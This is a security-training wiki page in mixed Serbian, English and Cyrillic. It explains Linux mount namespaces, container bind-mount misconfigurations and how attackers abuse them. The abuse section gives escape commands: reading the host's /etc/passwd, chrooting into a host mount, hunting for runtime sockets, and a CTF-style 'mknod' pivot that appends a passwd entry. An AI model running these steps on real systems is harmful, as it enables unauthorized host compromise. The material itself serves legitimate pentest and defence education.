# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

The mount namespace controls the **mount table** that a process sees. Ovo je jedna od najvažnijih funkcija izolacije kontejnera jer root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure i mnogi runtime-specific pomoćni mountovi svi bivaju izraženi kroz taj **mount table**. Dva procesa mogu oba pristupiti `/`, `/proc`, `/sys` ili `/tmp`, ali na šta ti putevi ukazuju zavisi od mount namespace-a u kojem se nalaze.

Iz perspektive bezbednosti kontejnera, mount namespace često predstavlja razliku između "ovo je uredno pripremljen fajl sistem aplikacije" i "ovaj proces može direktno videti ili uticati na host filesystem". Zbog toga se bind mounts, `hostPath` volumes, privilegovane mount operacije i mogućnost pisanja u `/proc` ili `/sys` sve vrte oko ovog namespace-a.

## Rad

Kada runtime pokreće kontejner, obično kreira novi mount namespace, priprema root filesystem za kontejner, mountuje procfs i druge pomoćne fajl sisteme po potrebi, a zatim opciono dodaje bind mounts, tmpfs mounts, secrets, config maps ili host paths. Kada taj proces radi unutar namespace-a, skup mountova koje vidi u velikoj meri je odvojen od podrazumevanog prikaza hosta. Host i dalje može videti stvarni osnovni fajl sistem, ali kontejner vidi verziju sastavljenu za njega od strane runtime-a.

Ovo je moćno jer omogućava kontejneru da veruje kako ima svoj sopstveni root filesystem iako host i dalje upravlja svime. Takođe je opasno, jer ako runtime izloži pogrešan mount, proces iznenada dobija vidljivost u host resurse koje ostatak bezbednosnog modela možda nije dizajniran da zaštiti.

## Lab

Možete kreirati privatni mount namespace pomoću:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ako otvorite drugi shell izvan te namespace i pregledate mount table, videćete da tmpfs mount postoji samo unutar izolovanog mount namespace-a. Ovo je koristan eksperiment jer pokazuje da mount isolation nije apstraktna teorija; kernel bukvalno prikazuje drugačiji mount table procesu.
Ako otvorite drugi shell izvan te namespace i pregledate mount table, tmpfs mount će postojati samo unutar izolovanog mount namespace-a.

Unutar containera, brza poredba je:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi primer pokazuje koliko je lako da runtime konfiguracija probuši ogroman otvor kroz granicu fajl sistema.

## Korišćenje u runtime okruženju

Docker, Podman, containerd-based stacks, and CRI-O se svi oslanjaju na privatni mount namespace za normalne kontejnere. Kubernetes gradi na istom mehanizmu za volumes, projected secrets, config maps i `hostPath` mounts. Incus/LXC okruženja se takođe u velikoj meri oslanjaju na mount namespaces, posebno zato što system containers često izlažu bogatije i više mašini slične fajl sisteme nego application containers.

To znači da kada pregledate problem sa filesystem-om kontejnera, obično ne gledate izolovanu Docker osobinu. Gledate problem mount-namespace i runtime konfiguracije izražen kroz platformu koja je pokrenula workload.

## Pogrešne konfiguracije

Najočiglednija i najopasnija greška je izlaganje host root filesystem-a ili neke druge osetljive host putanje kroz bind mount, na primer `-v /:/host` ili upisiv `hostPath` u Kubernetes. U tom trenutku, pitanje više nije "da li kontejner nekako može pobeći?" već "koliko korisnog sadržaja na hostu je već direktno vidljivo i upisivo?" Upisiv host bind mount često pretvara ostatak exploita u jednostavnu stvar postavljanja fajlova, chrooting, izmenu konfiguracije ili runtime socket discovery.

Još jedan čest problem je izlaganje host `/proc` ili `/sys` na načine koji zaobilaze sigurniji container view. Ovi fajl sistemi nisu obični data mount-ovi; oni su interfejsi ka kernel i stanju procesa. Ako workload direktno dosegne host verzije, mnoge pretpostavke koje stoje iza ojačavanja bezbednosti kontejnera prestaju da važe čisto.

Zaštite samo za čitanje su takođe važne. Root filesystem koji je samo za čitanje ne obezbeđuje kontejner magično, ali uklanja veliku količinu prostora za pripremu napadača i otežava persistence, postavljanje helper-binary fajlova i menjanje konfiguracije. Suprotno tome, upisiv root ili upisiv host bind mount daje napadaču prostor da pripremi sledeći korak.

## Zloupotreba

Kada se mount namespace zloupotrebljava, napadači obično čine jednu od četiri stvari. Oni **čitaju podatke sa hosta** koji su trebali ostati van kontejnera. Oni **izmenjuju konfiguraciju hosta** kroz upisive bind mount-ove. Oni **mountuju ili ponovo mountuju dodatne resurse** ako capabilities i seccomp to dozvoljavaju. Ili oni **dosegnu moćne sokete i direktorijume runtime stanja** koji im omogućavaju da od same container platform-e zatraže više pristupa.

Ako kontejner već može da vidi host fajl sistem, ostatak modela bezbednosti se odmah menja.

Kada sumnjate na host bind mount, prvo potvrdite šta je dostupno i da li je upisivo:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ako je host root filesystem mounted read-write, direct host access je često jednostavan kao:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ako je cilj privilegovan runtime pristup umesto direktnog chrooting-a, enumerišite sockets i runtime stanje:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ako je prisutan `CAP_SYS_ADMIN`, такође тестирајте да ли се новi mounts могу креирати из унутрашњости контејнера:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Potpun primer: Two-Shell `mknod` Pivot

Specijalizovaniji put zloupotrebe pojavljuje se kada container root user može da kreira block devices, host i container dele korisnički identitet na koristan način, i napadač već ima low-privilege foothold na hostu. U tom slučaju container može da kreira device node kao što je `/dev/sda`, a low-privilege host user može kasnije da ga pročita preko `/proc/<pid>/root/` za odgovarajući container process.

Unutar containera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Sa hosta, kao odgovarajući low-privilege user nakon lociranja container shell PID-a:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Važna lekcija nije tačna CTF pretraga stringova. Ona je da izlaganje mount-namespace kroz `/proc/<pid>/root/` može omogućiti host korisniku da ponovo iskoristi container-created device nodes čak i kada cgroup device policy spreči direktnu upotrebu unutar samog container-a.

## Checks

Ove komande služe da ti pokažu prikaz fajl-sistema u kojem trenutni proces zaista radi. Cilj je uočiti mountove poreklom sa hosta, upisive osetljive putanje i sve što izgleda šire od normalnog root fajl-sistema aplikacionog container-a.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- Bind mounts sa hosta, posebno `/`, `/proc`, `/sys`, runtime state direktorijumi ili lokacije soketa, treba da se odmah uoče.
- Neočekivani read-write mountovi obično su važniji od velikog broja read-only pomoćnih mountova.
- `mountinfo` je često najbolje mesto da se vidi da li je put zaista izveden sa hosta ili podržan overlay-om.

Ove provere utvrđuju **koji resursi su vidljivi u ovom namespace-u**, **koji su izvedeni sa hosta**, i **koji od njih su upisivi ili bezbednosno osetljivi**.
